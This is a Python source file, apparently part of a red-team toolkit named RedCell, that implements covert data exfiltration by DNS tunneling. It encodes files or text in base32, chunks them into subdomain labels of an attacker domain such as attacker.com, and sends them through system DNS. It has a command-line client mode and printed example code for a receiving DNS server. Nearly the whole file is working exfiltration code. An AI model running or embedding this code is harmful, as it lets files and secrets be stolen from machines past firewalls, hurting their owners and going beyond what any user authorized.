"""
DNS Tunneling Module

Covert data exfiltration via DNS queries.
"""

import base64
import socket
import time
from typing import Optional, List
import binascii


class DNSTunneling:
    """
    DNS tunneling for covert data exfiltration.

    Encodes data in DNS subdomain queries to bypass firewalls.

    Example:
        Data: "secret"
        DNS query: c2VjcmV0.attacker.com

    Features:
    - Base32/Base64 encoding
    - Chunking for long data
    - TXT record responses
    - Multiple query types (A, AAAA, TXT, MX)
    """

    MAX_LABEL_LENGTH = 63  # DNS label max length
    MAX_DOMAIN_LENGTH = 253  # DNS name max length

    def __init__(
        self,
        domain: str,
        dns_server: str = None,
        query_type: str = 'A',
        delay: float = 0.5
    ):
        """
        Initialize DNS tunneling.

        Args:
            domain: Base domain for queries (e.g., attacker.com)
            dns_server: Custom DNS server (default: system DNS)
            query_type: DNS query type (A, AAAA, TXT, MX)
            delay: Delay between queries in seconds
        """
        self.domain = domain
        self.dns_server = dns_server
        self.query_type = query_type
        self.delay = delay
        self.queries_sent = 0
        self.bytes_sent = 0

    def _encode_data(self, data: bytes) -> str:
        """
        Encode data for DNS query.

        Args:
            data: Data to encode

        Returns:
            Encoded string safe for DNS
        """
        # Use base32 for DNS-safe encoding (alphanumeric, no special chars)
        encoded = base64.b32encode(data).decode('utf-8')

        # Remove padding
        encoded = encoded.rstrip('=')

        # Convert to lowercase (DNS is case-insensitive)
        encoded = encoded.lower()

        return encoded

    def _chunk_data(self, encoded_data: str) -> List[str]:
        """
        Split encoded data into DNS-safe chunks.

        Args:
            encoded_data: Encoded data string

        Returns:
            List of chunks
        """
        chunks = []

        # Calculate max chunk size considering domain suffix
        max_chunk_size = self.MAX_LABEL_LENGTH

        # Split into chunks
        for i in range(0, len(encoded_data), max_chunk_size):
            chunk = encoded_data[i:i + max_chunk_size]
            chunks.append(chunk)

        return chunks

    def _send_dns_query(self, subdomain: str) -> bool:
        """
        Send DNS query.

        Args:
            subdomain: Subdomain to query

        Returns:
            True if successful
        """
        try:
            # Construct full domain
            full_domain = f"{subdomain}.{self.domain}"

            if self.dns_server:
                # Use custom DNS server
                # Note: Python's socket.gethostbyname doesn't support custom DNS server
                # In real implementation, would use dnspython or similar
                print(f"[*] Query: {full_domain} (custom DNS: {self.dns_server})")
            else:
                # Use system DNS
                socket.gethostbyname(full_domain)

            self.queries_sent += 1
            return True

        except (socket.gaierror, OSError):
            # DNS query failed, but that's expected
            # Attacker's DNS server still received the query
            self.queries_sent += 1
            return True

        except Exception as e:
            # Even on other exceptions, query was likely sent
            # (Network layer doesn't guarantee response)
            print(f"[!] DNS query exception: {e}")
            self.queries_sent += 1
            return True

    def exfiltrate_data(
        self,
        data: bytes,
        session_id: str = None
    ) -> bool:
        """
        Exfiltrate data via DNS queries.

        Args:
            data: Data to exfiltrate
            session_id: Session identifier

        Returns:
            True if successful
        """
        print(f"[*] Exfiltrating {len(data)} bytes via DNS tunneling...")

        # Encode data
        encoded = self._encode_data(data)

        # Split into chunks
        chunks = self._chunk_data(encoded)

        print(f"[*] Chunks: {len(chunks)}")

        # Send chunks
        for i, chunk in enumerate(chunks):
            # Construct subdomain with metadata
            if session_id:
                # Format: <session_id>-<chunk_index>-<total_chunks>-<data>
                subdomain = f"{session_id}-{i}-{len(chunks)}-{chunk}"
            else:
                # Format: <chunk_index>-<total_chunks>-<data>
                subdomain = f"{i}-{len(chunks)}-{chunk}"

            # Send query
            if not self._send_dns_query(subdomain):
                print(f"[-] Failed to send chunk {i}")
                return False

            # Progress
            progress = ((i + 1) / len(chunks)) * 100
            print(f"[*] Progress: {progress:.1f}% ({i + 1}/{len(chunks)})")

            # Delay to avoid rate limiting
            if self.delay > 0 and i < len(chunks) - 1:
                time.sleep(self.delay)

        self.bytes_sent += len(data)
        print(f"[+] Successfully exfiltrated {len(data)} bytes")
        return True

    def exfiltrate_file(
        self,
        file_path: str,
        session_id: str = None
    ) -> bool:
        """
        Exfiltrate file via DNS.

        Args:
            file_path: Path to file
            session_id: Session identifier

        Returns:
            True if successful
        """
        try:
            with open(file_path, 'rb') as f:
                data = f.read()

            print(f"[*] Exfiltrating file: {file_path} ({len(data)} bytes)")

            return self.exfiltrate_data(data, session_id=session_id)

        except Exception as e:
            print(f"[-] Error reading file: {e}")
            return False

    def exfiltrate_text(
        self,
        text: str,
        session_id: str = None
    ) -> bool:
        """
        Exfiltrate text via DNS.

        Args:
            text: Text to exfiltrate
            session_id: Session identifier

        Returns:
            True if successful
        """
        return self.exfiltrate_data(text.encode('utf-8'), session_id=session_id)

    def get_stats(self) -> dict:
        """
        Get exfiltration statistics.

        Returns:
            Statistics dictionary
        """
        return {
            'domain': self.domain,
            'queries_sent': self.queries_sent,
            'bytes_sent': self.bytes_sent,
            'query_type': self.query_type
        }

    def generate_report(self) -> str:
        """
        Generate exfiltration report.

        Returns:
            Formatted report string
        """
        stats = self.get_stats()

        report = []
        report.append("=" * 80)
        report.append("DNS TUNNELING REPORT")
        report.append("=" * 80)
        report.append(f"\nDomain: {stats['domain']}")
        report.append(f"Query Type: {stats['query_type']}")
        report.append(f"Queries Sent: {stats['queries_sent']}")
        report.append(f"Bytes Sent: {stats['bytes_sent']}")
        report.append("=" * 80)

        return "\n".join(report)


def create_dns_server(domain: str, output_dir: str = "dns_exfil"):
    """
    Create simple DNS server to receive tunneled data.

    Args:
        domain: Domain to respond to
        output_dir: Directory to save reconstructed files

    Note: Requires dnslib (pip install dnslib)
    """
    print("[*] DNS server functionality requires dnslib")
    print("[*] Install: pip install dnslib")
    print("[*] Example DNS server implementation:")
    print("""
    from dnslib import DNSRecord, QTYPE, RR, A
    from dnslib.server import DNSServer, BaseResolver
    import base64

    class TunnelResolver(BaseResolver):
        def resolve(self, request, handler):
            qname = str(request.q.qname)

            # Parse query
            # Format: <session_id>-<chunk_index>-<total_chunks>-<data>.<domain>
            parts = qname.split('.')

            if len(parts) >= 2:
                subdomain = parts[0]
                sub_parts = subdomain.split('-')

                if len(sub_parts) >= 4:
                    session_id = sub_parts[0]
                    chunk_index = int(sub_parts[1])
                    total_chunks = int(sub_parts[2])
                    encoded_data = '-'.join(sub_parts[3:])

                    print(f"[+] Received chunk {chunk_index}/{total_chunks} from {session_id}")

                    # Decode and save chunk
                    # ... (decode base32, save to file)

            # Return dummy response
            reply = request.reply()
            reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("127.0.0.1")))
            return reply

    # Start server
    resolver = TunnelResolver()
    server = DNSServer(resolver, port=53)
    server.start()
    """)


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell DNS Tunneling')

    subparsers = parser.add_subparsers(dest='mode', help='Mode')

    # Client mode
    client_parser = subparsers.add_parser('client', help='Exfiltrate data')
    client_parser.add_argument('--domain', required=True, help='Base domain (e.g., attacker.com)')
    client_parser.add_argument('--file', help='File to exfiltrate')
    client_parser.add_argument('--text', help='Text to exfiltrate')
    client_parser.add_argument('--dns-server', help='Custom DNS server')
    client_parser.add_argument('--delay', type=float, default=0.5, help='Delay between queries')
    client_parser.add_argument('--session-id', help='Session ID')

    # Server mode (informational)
    server_parser = subparsers.add_parser('server', help='Show DNS server example')
    server_parser.add_argument('--domain', required=True, help='Domain to listen for')

    args = parser.parse_args()

    if args.mode == 'server':
        create_dns_server(args.domain)

    elif args.mode == 'client':
        dns_tunnel = DNSTunneling(
            domain=args.domain,
            dns_server=args.dns_server,
            delay=args.delay
        )

        if args.file:
            dns_tunnel.exfiltrate_file(args.file, session_id=args.session_id)

        elif args.text:
            dns_tunnel.exfiltrate_text(args.text, session_id=args.session_id)

        else:
            print("[-] Specify --file or --text")
            return

        # Print report
        print("\n")
        print(dns_tunnel.generate_report())

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
